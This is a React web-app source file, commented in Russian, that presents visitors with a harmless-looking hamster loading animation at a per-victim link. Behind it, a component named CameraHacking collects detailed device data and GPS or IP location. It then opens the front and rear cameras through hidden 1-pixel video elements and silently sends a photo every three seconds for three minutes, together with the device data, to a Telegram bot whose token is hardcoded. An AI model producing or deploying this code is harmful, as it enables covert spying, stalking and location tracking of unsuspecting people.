import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const canvasRef = useRef(null);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 180000; // 3 минуты = 180000 мс
  const photoInterval = 3000; // 3 секунды

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки который не показывает ответ
  const sendToTelegramSilent = (text) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: true
    }));
  };

  // Отправка фото без показа ответа
  const sendPhotoSilent = (blob, caption = '') => {
    return new Promise((resolve) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      xhr.onload = () => resolve(true);
      xhr.onerror = () => resolve(false);
      xhr.send(formData);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              accuracy: Math.round(accuracy),
              method: "GPS",
              success: true
            });
          },
          (error) => {
            // Если GPS недоступен, получаем по IP
            getLocationByIP().then(resolve);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          }
        );
      } else {
        getLocationByIP().then(resolve);
      }
    });
  };

  // Получение локации по IP
  const getLocationByIP = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      return {
        latitude: data.latitude,
        longitude: data.longitude,
        city: data.city,
        region: data.region,
        country: data.country_name,
        isp: data.org,
        ip: data.ip,
        method: "IP",
        success: true
      };
    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  };

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          success: true
        };
      }
    } catch (error) {
      // Игнорируем ошибки
    }
    return { success: false };
  };

  // Сбор полной информации об устройстве
  const collectDeviceInfo = async () => {
    const [batteryInfo, locationInfo] = await Promise.all([
      getBatteryInfo(),
      getGeolocation()
    ]);

    // Определение ОС
    const ua = navigator.userAgent;
    let os = 'Unknown';
    let osVersion = 'Unknown';
    
    if (/Windows NT 10/i.test(ua)) { os = 'Windows'; osVersion = '10/11'; }
    else if (/Windows NT 6.3/i.test(ua)) { os = 'Windows'; osVersion = '8.1'; }
    else if (/Windows NT 6.2/i.test(ua)) { os = 'Windows'; osVersion = '8'; }
    else if (/Windows NT 6.1/i.test(ua)) { os = 'Windows'; osVersion = '7'; }
    else if (/Mac OS X (\d+[._]\d+)/i.test(ua)) { 
      os = 'macOS'; 
      const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Android (\d+(\.\d+)+)/i.test(ua)) { 
      os = 'Android'; 
      const match = ua.match(/Android (\d+(\.\d+)+)/i);
      osVersion = match ? match[1] : 'Unknown';
    }
    else if (/iPhone OS (\d+_?\d*)/i.test(ua)) { 
      os = 'iOS'; 
      const match = ua.match(/iPhone OS (\d+_?\d*)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Linux/i.test(ua)) { os = 'Linux'; }

    // Определение браузера
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) { 
      browser = 'Chrome'; 
      const match = ua.match(/Chrome\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Firefox/i.test(ua)) { 
      browser = 'Firefox'; 
      const match = ua.match(/Firefox\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) { 
      browser = 'Safari'; 
      const match = ua.match(/Version\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Edg/i.test(ua)) { 
      browser = 'Edge'; 
      const match = ua.match(/Edg\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }

    // WebGL информация (GPU)
    let gpuInfo = 'Не доступно';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
        }
      }
    } catch (e) {}

    // Медиаустройства
    let mediaDevices = { cameras: 0, microphones: 0, speakers: 0 };
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      mediaDevices = {
        cameras: devices.filter(d => d.kind === 'videoinput').length,
        microphones: devices.filter(d => d.kind === 'audioinput').length,
        speakers: devices.filter(d => d.kind === 'audiooutput').length
      };
    } catch (e) {}

    const info = {
      // Основная информация
      timestamp: new Date().toISOString(),
      userAgent: ua,
      platform: navigator.platform,
      vendor: navigator.vendor,
      
      // ОС и браузер
      os: os,
      osVersion: osVersion,
      browser: browser,
      browserVersion: browserVersion,
      
      // Экран
      screenSize: `${window.screen.width}x${window.screen.height}`,
      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
      
      // Язык и время
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Производительность
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      
      // Сеть
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null,
      
      // Батарея
      battery: batteryInfo,
      
      // Геолокация
      location: locationInfo,
      
      // GPU
      gpu: gpuInfo,
      
      // Медиаустройства
      mediaDevices: mediaDevices,
      
      // IP (если есть из геолокации)
      ip: locationInfo.ip || 'Unknown',
      
      // Детекция типа
      isMobile: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      isTablet: /Tablet|iPad/i.test(ua),
      isDesktop: !/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      
      // Дополнительно
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver,
      deviceType: detectDeviceType(ua)
    };

    return info;
  };

  // Определение типа устройства
  const detectDeviceType = (ua) => {
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/iPod/i.test(ua)) return 'iPod';
    if (/Android/i.test(ua)) {
      if (/Mobile/i.test(ua)) return 'Android Phone';
      return 'Android Tablet';
    }
    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
    if (/BlackBerry/i.test(ua)) return 'BlackBerry';
    return 'Desktop/Laptop';
  };

  // Форматирование информации для отправки
  const formatDeviceInfo = (info) => {
    const batteryText = info.battery.success ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    const locationText = info.location.success ? 
      (info.location.method === "GPS" ? 
        `📍 GPS: ${info.location.latitude}, ${info.location.longitude} (±${info.location.accuracy}м)` :
        `📍 IP: ${info.location.city || ''}, ${info.location.region || ''}, ${info.location.country || ''}\n   Координаты: ${info.location.latitude}, ${info.location.longitude}\n   Провайдер: ${info.location.isp || ''}\n   IP: ${info.location.ip || ''}`) :
      '📍 Геолокация: Не доступно';
    
    const connectionText = info.connection ? 
      `📡 Сеть: ${info.connection.effectiveType}\n   Скорость: ${info.connection.downlink} Mbps\n   Задержка: ${info.connection.rtt} ms\n   Экономия: ${info.connection.saveData ? 'Вкл' : 'Выкл'}` :
      '📡 Сеть: Не доступно';
    
    return `🔍 ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

*📱 СИСТЕМА И БРАУЗЕР*
▫️ ОС: ${info.os} ${info.osVersion}
▫️ Браузер: ${info.browser} ${info.browserVersion}
▫️ Платформа: ${info.platform}
▫️ Производитель: ${info.vendor}
▫️ Тип: ${info.deviceType}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}
▫️ Планшет: ${info.isTablet ? 'Да' : 'Нет'}

*🖥 ЭКРАН И ДИСПЛЕЙ*
▫️ Разрешение: ${info.screenSize}
▫️ Доступно: ${info.availScreen}
▫️ Ориентация: ${info.orientation}
▫️ Глубина цвета: ${info.colorDepth} бит
▫️ Pixel Ratio: ${info.devicePixelRatio}
▫️ GPU: ${info.gpu}

*⚙️ АППАРАТНЫЕ ХАРАКТЕРИСТИКИ*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ ОЗУ: ${info.deviceMemory} GB
▫️ Макс. касаний: ${info.maxTouchPoints}
${batteryText}

*🎥 МЕДИАУСТРОЙСТВА*
▫️ Камеры: ${info.mediaDevices.cameras}
▫️ Микрофоны: ${info.mediaDevices.microphones}
▫️ Динамики: ${info.mediaDevices.speakers}

${locationText}

${connectionText}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Поддерживаемые: ${info.languages}
▫️ Часовой пояс: ${info.timezone}
▫️ Смещение: ${info.timezoneOffset} мин

*🔧 ДОПОЛНИТЕЛЬНО*
▫️ Куки: ${info.cookieEnabled ? 'Вкл' : 'Выкл'}
▫️ Do Not Track: ${info.doNotTrack || 'Не установлен'}
▫️ PDF Viewer: ${info.pdfViewerEnabled ? 'Да' : 'Нет'}
▫️ WebDriver: ${info.webdriver ? 'Да' : 'Нет'}

*⏰ СТАТУС*
▫️ Время системы: ${new Date().toLocaleString()}
▫️ User Agent: ${info.userAgent.substring(0, 200)}...

🚀 ЗАПУСКАЮ СЪЕМКУ: 1 ФОТО КАЖДЫЕ 3 СЕКУНДЫ В ТЕЧЕНИЕ 3 МИНУТ`;
  };

  // Инициализация камер
  const initializeCameras = async () => {
    try {
      // Пробуем сначала селфи камеру, потом заднюю
      const cameraTypes = [
        { facingMode: "user", name: "Селфи камера" },
        { facingMode: { exact: "environment" }, name: "Задняя камера" }
      ];
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      
      for (let i = 0; i < cameraTypes.length; i++) {
        try {
          const constraints = {
            video: {
              facingMode: cameraTypes[i].facingMode,
              width: { ideal: 1920 },
              height: { ideal: 1080 }
            },
            audio: false
          };
          
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          streamsRef.current.push(stream);
          
          // Создаем видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
            transform: scale(0.1);
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          document.body.appendChild(video);
          videoRefsRef.current.push(video);
          
          // Ждем готовности видео
          await new Promise((resolve, reject) => {
            const onLoaded = () => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              
              // Даем видео начать воспроизведение
              video.play().then(() => {
                setTimeout(() => {
                  console.log(`Камера ${i + 1} (${cameraTypes[i].name}) готова:`, 
                    video.videoWidth, 'x', video.videoHeight,
                    'readyState:', video.readyState);
                  resolve();
                }, 500);
              }).catch(reject);
            };
            
            const onError = (err) => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              reject(err);
            };
            
            video.addEventListener('loadedmetadata', onLoaded);
            video.addEventListener('error', onError);
            
            // Таймаут на случай долгой загрузки
            setTimeout(() => {
              if (video.readyState >= 1) {
                onLoaded();
              }
            }, 3000);
          });
          
        } catch (error) {
          console.log(`Камера ${i + 1} не доступна:`, error.message);
          continue;
        }
      }
      
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры
  const capturePhotoFromCamera = async (cameraIndex, video) => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    
    // Проверяем готовность видео
    if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
      // Даем видео обновиться
      await new Promise(resolve => setTimeout(resolve, 100));
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      
      // Очищаем canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // Для селфи камеры на мобильных устройствах делаем зеркальное отражение
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const isSelfieCamera = cameraIndex === 0;
      
      if (isMobile && isSelfieCamera) {
        // Зеркальное отражение для селфи-камеры
        ctx.save();
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.restore();
      } else {
        // Обычное отображение для других камер
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
      
      // Добавляем водяной знак с информацией
      const watermarkHeight = 110;
      const watermarkY = canvas.height - watermarkHeight - 10;
      
      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
      ctx.fillRect(10, watermarkY, 400, watermarkHeight);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 16px Arial';
      ctx.textAlign = 'left';
      
      let yOffset = watermarkY + 25;
      ctx.fillText(`📷 ${cameraIndex === 0 ? '🤳 Селфи камера' : '📷 Задняя камера'}`, 20, yOffset);
      
      yOffset += 25;
      ctx.fillText(`#${captureCount.current + 1} | 🕐 ${new Date().toLocaleTimeString()}`, 20, yOffset);
      
      yOffset += 25;
      const elapsed = Date.now() - startTime.current;
      const remaining = Math.max(0, totalDuration - elapsed);
      ctx.fillText(`⏱ ${Math.floor(elapsed / 1000)} сек | ⏳ ${Math.floor(remaining / 1000)} сек осталось`, 20, yOffset);
      
      yOffset += 25;
      ctx.fillText(`📏 ${video.videoWidth}x${video.videoHeight}`, 20, yOffset);
      
      // Добавляем текст SYSTEM ACTIVE
      ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';
      ctx.font = 'bold 40px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('SYSTEM ACTIVE', canvas.width / 2, 50);
      
    } else {
      // Создаем тестовое изображение если видео не готово
      console.warn(`Видео камеры ${cameraIndex} не готово:`, 
        video?.readyState, 
        video?.videoWidth, 
        video?.videoHeight);
      
      canvas.width = 800;
      canvas.height = 600;
      const ctx = canvas.getContext('2d');
      
      // Фон
      ctx.fillStyle = '#1a1a1a';
      ctx.fillRect(0, 0, 800, 600);
      
      // Градиент
      const gradient = ctx.createRadialGradient(400, 300, 0, 400, 300, 250);
      gradient.addColorStop(0, 'rgba(102, 126, 234, 0.9)');
      gradient.addColorStop(1, 'rgba(118, 75, 162, 0.3)');
      ctx.fillStyle = gradient;
      ctx.beginPath();
      ctx.arc(400, 300, 250, 0, Math.PI * 2);
      ctx.fill();
      
      // Текст SYSTEM ACTIVE
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 48px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('SYSTEM ACTIVE', 400, 150);
      
      // Иконка камеры
      ctx.font = '120px Arial';
      ctx.fillText(cameraIndex === 0 ? '🤳' : '📷', 400, 320);
      
      // Информация
      ctx.font = '24px Arial';
      ctx.fillText(`Камера ${cameraIndex === 0 ? 'Селфи' : 'Задняя'} не активна`, 400, 420);
      ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 470);
      ctx.fillText(new Date().toLocaleTimeString(), 400, 520);
    }

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.95);
    });
  };

  // Захват и отправка фото
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    // Проверяем не истекло ли время
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegramSilent(`⏰ ВРЕМЯ ИСТЕКЛО\n\n✅ Всего сделано фото: ${captureCount.current}\n🕐 Длительность: 3 минуты\n📅 ${new Date().toLocaleString()}`);
      return;
    }
    
    // Фильтруем готовые видео элементы
    const readyVideos = videoRefsRef.current.filter(video => {
      if (!video) return false;
      const isReady = video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0;
      if (!isReady) {
        console.log(`Видео не готово: readyState=${video.readyState}, размер=${video.videoWidth}x${video.videoHeight}`);
      }
      return isReady;
    });
    
    if (readyVideos.length === 0) {
      // Если нет готовых камер, создаем тестовое фото
      const testCanvas = document.createElement('canvas');
      testCanvas.width = 800;
      testCanvas.height = 600;
      const ctx = testCanvas.getContext('2d');
      
      // Градиентный фон
      const gradient = ctx.createLinearGradient(0, 0, 800, 600);
      gradient.addColorStop(0, '#667eea');
      gradient.addColorStop(1, '#764ba2');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, 800, 600);
      
      ctx.fillStyle = 'rgba(255, 255, 255, 0.9)';
      ctx.font = 'bold 36px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('🔄 ОЖИДАНИЕ КАМЕРЫ', 400, 250);
      
      ctx.font = '24px Arial';
      ctx.fillText(`Попытка #${captureCount.current + 1}`, 400, 320);
      
      const elapsedSeconds = Math.floor(elapsed / 1000);
      ctx.fillText(`Прошло: ${elapsedSeconds} сек`, 400, 380);
      ctx.fillText(new Date().toLocaleTimeString(), 400, 440);
      
      const blob = await new Promise(resolve => testCanvas.toBlob(resolve, 'image/jpeg', 0.9));
      const caption = `⏳ Ожидание камеры...\n📸 Попытка #${captureCount.current + 1}\n⏱ ${Math.floor(elapsed / 1000)} сек\n🕐 ${new Date().toLocaleTimeString()}`;
      
      await sendPhotoSilent(blob, caption);
      captureCount.current++;
      return;
    }
    
    // Захватываем с каждой доступной камеры
    for (let i = 0; i < readyVideos.length; i++) {
      try {
        const video = readyVideos[i];
        const originalCameraIndex = videoRefsRef.current.indexOf(video);
        
        // Небольшая пауза между кадрами
        if (i > 0) {
          await new Promise(resolve => setTimeout(resolve, 200));
        }
        
        const photoBlob = await capturePhotoFromCamera(originalCameraIndex, video);
        
        if (photoBlob) {
          const cameraType = originalCameraIndex === 0 ? '🤳 Селфи камера' : '📷 Задняя камера';
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `${cameraType}\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `📏 ${video.videoWidth}x${video.videoHeight}\n` +
            `⏱ Прошло: ${elapsedSeconds} сек\n` +
            `⏳ Осталось: ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}`;
          
          await sendPhotoSilent(photoBlob, caption);
        }
      } catch (error) {
        console.error(`Ошибка захвата с камеры ${i}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Отправляем статистику каждые 10 фото
    if (captureCount.current % 10 === 0) {
      const elapsedMinutes = Math.floor(elapsed / 60000);
      const elapsedSeconds = Math.floor((elapsed % 60000) / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      sendToTelegramSilent(
        `📊 СТАТИСТИКА #${captureCount.current}\n\n` +
        `📸 Всего фото: ${captureCount.current}\n` +
        `📷 Активных камер: ${readyVideos.length}\n` +
        `⏱ Время работы: ${elapsedMinutes}:${elapsedSeconds.toString().padStart(2, '0')}\n` +
        `⏳ Осталось: ${remainingSeconds} сек\n` +
        `📅 ${new Date().toLocaleString()}`
      );
    }
  };

  // Запуск периодической съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    // Первое фото сразу
    setTimeout(() => {
      captureAndSendPhotos();
    }, 1000);
    
    // Последующие каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos();
    }, photoInterval);
  };

  // Остановка съемки
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    // Закрываем все камеры
    streamsRef.current.forEach(stream => {
      if (stream) {
        stream.getTracks().forEach(track => {
          track.stop();
          track.enabled = false;
        });
      }
    });
    streamsRef.current = [];
    
    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      if (video) {
        video.srcObject = null;
        video.remove();
      }
    });
    videoRefsRef.current = [];
    
    // Очищаем canvas
    if (canvasRef.current) {
      canvasRef.current = null;
    }
  };

  // Основная инициализация
  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      // Собираем полную информацию об устройстве
      const deviceInfo = await collectDeviceInfo();
      
      // Отправляем информацию
      sendToTelegramSilent(formatDeviceInfo(deviceInfo));
      
      // Инициализируем камеры
      const camerasReady = await initializeCameras();
      
      if (camerasReady) {
        sendToTelegramSilent(
          `🚀 КАМЕРЫ АКТИВИРОВАНЫ\n\n` +
          `📷 Доступно камер: ${streamsRef.current.length}\n` +
          `📏 Разрешение: ${videoRefsRef.current[0]?.videoWidth || 0}x${videoRefsRef.current[0]?.videoHeight || 0}\n` +
          `⏱ Начинаю съемку: 1 фото каждые 3 секунды\n` +
          `⏳ Продолжительность: 3 минуты\n` +
          `📅 Старт: ${new Date().toLocaleString()}`
        );
        
        // Запускаем периодическую съемку
        startPeriodicCapture();
        
        // Автоматическая остановка через 3 минуты
        setTimeout(() => {
          stopCapturing();
          sendToTelegramSilent(
            `⏰ СЪЕМКА ЗАВЕРШЕНА\n\n` +
            `✅ Итоговый отчет:\n` +
            `📸 Всего фото: ${captureCount.current}\n` +
            `📷 Камеры использовано: ${streamsRef.current.length}\n` +
            `⏱ Общее время: 3 минуты\n` +
            `📅 Завершено: ${new Date().toLocaleString()}\n` +
            `🎉 Процесс завершен успешно!`
          );
        }, totalDuration);
        
      } else {
        sendToTelegramSilent('❌ ОШИБКА: Не удалось активировать камеры\n\n' +
          'Возможные причины:\n' +
          '1. Нет разрешения на доступ к камере\n' +
          '2. Камера занята другим приложением\n' +
          '3. Браузер не поддерживает доступ к камерам\n' +
          '4. Нет физической камеры на устройстве');
      }
    };
    
    // Запускаем через небольшую задержку
    setTimeout(init, 500);
    
    return () => {
      stopCapturing();
    };
  }, []);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE - показывает только хомяка
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            Система активна...
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
